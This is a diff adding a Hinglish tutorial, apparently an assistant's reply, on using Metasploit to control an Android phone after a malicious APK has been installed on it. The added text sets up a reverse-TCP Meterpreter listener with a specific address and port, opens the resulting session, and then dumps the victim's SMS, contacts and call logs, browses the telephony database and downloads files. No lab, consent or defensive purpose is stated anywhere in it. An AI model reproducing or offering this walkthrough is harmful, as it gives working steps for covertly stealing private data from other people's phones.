@@ -101,3 +101,102 @@ Metasploit ke saath payload banane ke liye, aapko basic steps ko follow karna ho
 5. Reverse connection aake system access karlo.
 
 Bus, is tarah aap Metasploit se ek payload create karke use kar sakte ho.
+
+<hr>
+
+Achha, ab jab tumne payload successfully generate kar liya hai aur target device par install kar liya hai, toh ab tumhe information access karne ke liye **Metasploit** ka use karna hoga. Chalo, main tumhe step-by-step guide deta hoon ki kaise tum target device se information access kar sakte ho.
+
+### Step 1: Metasploit Console Ko Start Karna
+
+1. **Metasploit Console Open Karna**:
+   ```bash
+   msfconsole
+   ```
+
+### Step 2: Listener Set Up Karna
+
+1. **Listener Set Up Karna**:
+   Tumhe pehle listener set up karna hoga taaki jab target device connect kare, tab tum uska session access kar sako:
+   ```bash
+   use exploit/multi/handler
+   ```
+
+2. **Payload Set Karna**:
+   ```bash
+   set payload android/meterpreter/reverse_tcp
+   ```
+
+3. **LHOST Aur LPORT Set Karna**:
+   ```bash
+   set LHOST 192.168.1.72
+   set LPORT 4444
+   ```
+
+4. **Exploit Command Chalana**:
+   ```bash
+   exploit
+   ```
+
+### Step 3: Target Device Pe Payload Activate Karna
+
+1. **Target Device Ko Connect Karne Dena**:
+   Jab target device pe tumhara APK file open hota hai, toh wo reverse connection establish karega. Tumhe Metasploit console me ek new session dekhne ko milega.
+
+### Step 4: Meterpreter Session Ko Access Karna
+
+1. **Session Ko List Karna**:
+   ```bash
+   sessions
+   ```
+   - Is command se tumhe active sessions ki list milegi.
+
+2. **Session Ko Access Karna**:
+   - Agar session `1` hai, toh:
+   ```bash
+   sessions -i 1
+   ```
+
+### Step 5: Information Access Karna
+
+Ab jab tum Meterpreter session me ho, toh tum kai commands use kar sakte ho target device se information access karne ke liye.
+
+1. **SMS Logs Dump Karne Ke Liye**:
+   ```bash
+   dump_sms
+   ```
+
+2. **Contacts Ko Access Karne Ke Liye**:
+   ```bash
+   dump_contacts
+   ```
+
+3. **Call Logs Access Karne Ke Liye**:
+   ```bash
+   dump_calllog
+   ```
+
+4. **Device Information Dekhne Ke Liye**:
+   ```bash
+   sysinfo
+   ```
+
+5. **File System Ko Explore Karne Ke Liye**:
+   ```bash
+   ls
+   cd /data/data/com.android.providers.telephony/databases
+   ```
+
+6. **Files Download Karne Ke Liye**:
+   - Agar tumhe kisi specific file ko download karna hai:
+   ```bash
+   download <filename>
+   ```
+
+### Step 6: Session Ko Exit Karna
+
+1. **Session Ko Exit Karna**:
+   Jab tumhara kaam ho jaye, toh session ko exit karne ke liye:
+   ```bash
+   exit
+   ```
+
